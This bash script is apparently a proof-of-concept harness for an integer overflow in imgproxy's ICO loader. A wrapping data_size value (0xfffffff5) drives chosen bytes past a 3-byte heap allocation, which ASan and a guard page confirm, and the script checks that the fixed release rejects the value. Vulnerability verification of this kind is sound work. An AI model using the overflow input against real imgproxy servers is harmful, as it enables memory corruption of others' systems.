#!/usr/bin/env bash
# Source-bound imgproxy ICO data_size integer-overflow harness.
# All inputs are local argv values standing in for an uploaded ICO entry;
# no HTTP server, libvips process or external system is contacted.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
ulimit -c 0 2>/dev/null || true
OUT=${1:-"$HERE/out"}
mkdir -p "$OUT"
cd "$HERE" || exit 2
OUT=$(cd "$OUT" && pwd)

pass=0; fail=0
check() {
    if [ "$2" = 1 ]; then echo "PASS $1"; pass=$((pass + 1));
    else echo "FAIL $1"; fail=$((fail + 1)); fi
}
contains() { case "$2" in *"$1"*) return 0;; *) return 1;; esac; }
yes() { contains "$1" "$2" && echo 1 || echo 0; }

python3 gen_driver.py > "$OUT/gen.log" || exit 2
for t in vuln fixed vuln_asan fixed_asan; do
    src=driver_${t%_asan}.c
    case "$t" in
        *_asan) gcc -std=gnu11 -g -O0 -fsanitize=address -fno-omit-frame-pointer \
                    "$src" -o "$OUT/$t" || exit 2 ;;
        *)      gcc -std=gnu11 -g -O0 "$src" -o "$OUT/$t" || exit 2 ;;
    esac
done
V="$OUT/vuln"; F="$OUT/fixed"; VA="$OUT/vuln_asan"; FA="$OUT/fixed_asan"
WRAP=4294967285   # 0xfffffff5: + 14 wraps to 3

# Rung 1: declared size wraps the 14-byte header allowance to 3 bytes.
r1=$($V collab $WRAP 32 65)
echo "$r1"
check "rung1 data_size wrap allocates 3 bytes" \
    "$(yes 'rv=0 alloc=3' "$r1")"

# Rung 2: the read_full stand-in writes at data+14, 11 bytes past the 3-byte
# allocation, and the bytes are read back from a known collaborator offset.
ok=0
contains 'actual5=4142434441424344' "$r1" &&
contains 'actual32=4142434441424344414243444142434441424344414243444142434441424344' "$r1" && ok=1
check "rung2 chosen bytes at data+14 past alloc" "$ok"

# Rung 3: ASan traps the verbatim read_full call at pinned line 161.
"$VA" exact $WRAP 32 65 > "$OUT/asan.log" 2>&1
ac=$(cat "$OUT/asan.log")
ok=0
contains 'heap-buffer-overflow' "$ac" &&
contains 'WRITE of size 32' "$ac" &&
contains 'icoload_v4.0.15:161' "$ac" && ok=1
check "rung3 ASan write at pinned :161" "$ok"

# Rung 4: a different selected body seed is read back byte-exact.
r4=$($V collab $WRAP 32 90)
echo "$r4"
ok=0
contains 'alloc=3' "$r4" &&
contains 'actual5=5a5b5c5d5a5b5c5d' "$r4" &&
contains 'actual32=5a5b5c5d5a5b5c5d5a5b5c5d5a5b5c5d5a5b5c5d5a5b5c5d5a5b' "$r4" && ok=1
check "rung4 chosen 0x5a bytes at data+14" "$ok"

# Guard page: the first past-end store crosses into PROT_NONE.
( "$V" guard $WRAP 8 65 > "$OUT/guard.log" 2>&1 )
grc=$?
check "guard page fault on first past-end write" "$([ "$grc" -eq 139 ] && echo 1 || echo 0)"

# Fixed v4.0.16 rejects the hostile size before allocation; benign size ok.
fc=$($F collab $WRAP 32 65)
check "fixed rejects wrapped data_size" "$(yes 'rv=-1 alloc=0' "$fc")"
fg=$($F collab 32 32 65)
check "fixed accepts benign data_size" "$(yes 'rv=0 alloc=46' "$fg")"

"$FA" exact $WRAP 32 65 > "$OUT/fixed_asan_bad.log" 2>&1
"$FA" exact 32 32 65 > "$OUT/fixed_asan_good.log" 2>&1
fb=$(cat "$OUT/fixed_asan_bad.log")
fgo=$(cat "$OUT/fixed_asan_good.log")
ok=0
! contains 'AddressSanitizer' "$fb" && ! contains 'AddressSanitizer' "$fgo" && ok=1
check "fixed ASan clean on hostile and benign" "$ok"
ok=0
contains 'rv=-1' "$fb" && contains 'rv=0' "$fgo" && ok=1
check "fixed ASan outcomes" "$ok"

# Determinism: two independent five-run groups, chosen bytes and pinned line.
group() {
    for i in 1 2 3 4 5; do
        "$V" collab $WRAP 32 65
        "$VA" exact $WRAP 32 65 2>&1 | grep -E 'ERROR: AddressSanitizer|icoload_v4.0.15:161' | head -2
        "$F" collab $WRAP 32 65
    done | grep -v -E '0x[0-9a-f]+|pid=|SUMMARY: AddressSanitizer' \
        | sha256sum | cut -d' ' -f1
}
h1=$(group); h2=$(group)
echo "sha256=$h1 sha256_b=$h2 (two independent 5-run groups)"
check "determinism two 5-run groups identical" "$([ "$h1" = "$h2" ] && echo 1 || echo 0)"

echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ] && { echo "ALL CHECKS PASS rc 0"; exit 0; }
echo "SOME CHECKS FAILED rc 1"; exit 1
